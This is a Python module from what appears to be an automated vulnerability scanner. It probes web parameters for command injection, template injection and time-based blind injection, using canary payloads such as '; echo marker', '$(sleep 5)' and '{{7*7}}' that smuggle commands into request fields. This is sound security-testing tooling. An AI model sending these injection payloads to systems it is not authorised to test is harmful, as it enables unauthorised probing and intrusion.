"""RCE agent: command injection, template injection (SSTI), and basic
deserialization probing. Stays to safe canaries by design -- a reflected
marker string or a `7*7` math evaluation proves execution without ever
running a destructive command. Time-based blind detection is the last
resort since it's the least reliable signal.
"""
from __future__ import annotations

import time
import uuid

from noctis.agents.base_agent import AgentResult
from noctis.agents.http_agent import HttpAgent
from noctis.agents.targeting import apply_payload

ECHO_TEMPLATES = ["; echo {marker}", "| echo {marker}", "`echo {marker}`", "$(echo {marker})", "& echo {marker}"]
SSTI_PAYLOADS = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"), ("<%= 7*7 %>", "49")]
TIME_PAYLOADS = [
    ("; sleep 5", 5), ("| sleep 5", 5), ("$(sleep 5)", 5), ("`sleep 5`", 5),
    ("& timeout /T 5 > NUL", 5), ("| timeout /T 5 > NUL", 5),
]
TIME_THRESHOLD_SECONDS = 4.5


class RCEAgent(HttpAgent):
    agent_type = "rce"

    async def run(self) -> AgentResult:
        if self.target is None or not self.target.param_names:
            return self.no_target_result()

        for param in self.target.param_names:
            result = await self._echo_canary(param)
            if result:
                return result
            result = await self._ssti(param)
            if result:
                return result

        baseline_elapsed = await self._baseline_elapsed()
        if baseline_elapsed is not None and baseline_elapsed < 2.0:
            for param in self.target.param_names:
                result = await self._time_based(param, baseline_elapsed)
                if result:
                    return result

        return AgentResult(found=False, notes=f"no RCE/SSTI confirmed across {len(self.target.param_names)} param(s)")

    async def _echo_canary(self, param: str) -> AgentResult | None:
        marker = f"NOCTIS_RCE_{uuid.uuid4().hex[:8]}"
        for template in ECHO_TEMPLATES:
            payload = template.format(marker=marker)
            url, body = apply_payload(self.target, param, payload)
            try:
                response = await self.client.request(self.target.method, url, data=body)
            except Exception:
                continue
            if marker in response.text:
                async def recheck(u=url, b=body, m=marker) -> bool:
                    r = await self.client.request(self.target.method, u, data=b)
                    return m in r.text

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=payload,
                    request=self._format_request(self.target.method, url, body),
                    response=self._format_response(response),
                    evidence=f"command injection confirmed on param '{param}': injected marker '{marker}' echoed back in response",
                    poc_request=self._poc_request(self.target.method, url, body),
                )
        return None

    async def _ssti(self, param: str) -> AgentResult | None:
        for payload, expected in SSTI_PAYLOADS:
            url, body = apply_payload(self.target, param, payload)
            try:
                response = await self.client.request(self.target.method, url, data=body)
            except Exception:
                continue
            if expected in response.text and payload not in response.text:
                async def recheck(u=url, b=body, e=expected, p=payload) -> bool:
                    r = await self.client.request(self.target.method, u, data=b)
                    return e in r.text and p not in r.text

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=payload,
                    request=self._format_request(self.target.method, url, body),
                    response=self._format_response(response),
                    evidence=f"template injection (SSTI) on param '{param}': '{payload}' evaluated to '{expected}'",
                    poc_request=self._poc_request(self.target.method, url, body),
                )
        return None

    async def _baseline_elapsed(self) -> float | None:
        from noctis.agents.targeting import baseline_request

        url, body = baseline_request(self.target)
        try:
            start = time.monotonic()
            await self.client.request(self.target.method, url, data=body)
            return time.monotonic() - start
        except Exception:
            return None

    async def _time_based(self, param: str, baseline_elapsed: float) -> AgentResult | None:
        for payload, delay in TIME_PAYLOADS:
            url, body = apply_payload(self.target, param, payload)
            start = time.monotonic()
            try:
                response = await self.client.request(self.target.method, url, data=body)
            except Exception:
                continue
            elapsed = time.monotonic() - start
            if elapsed >= TIME_THRESHOLD_SECONDS:
                async def recheck(u=url, b=body) -> bool:
                    s = time.monotonic()
                    await self.client.request(self.target.method, u, data=b)
                    return (time.monotonic() - s) >= TIME_THRESHOLD_SECONDS

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=payload,
                    request=self._format_request(self.target.method, url, body),
                    response=self._format_response(response),
                    evidence=f"time-blind command injection on param '{param}': response took {elapsed:.1f}s for a {delay}s sleep payload",
                    poc_request=self._poc_request(self.target.method, url, body),
                )
        return None
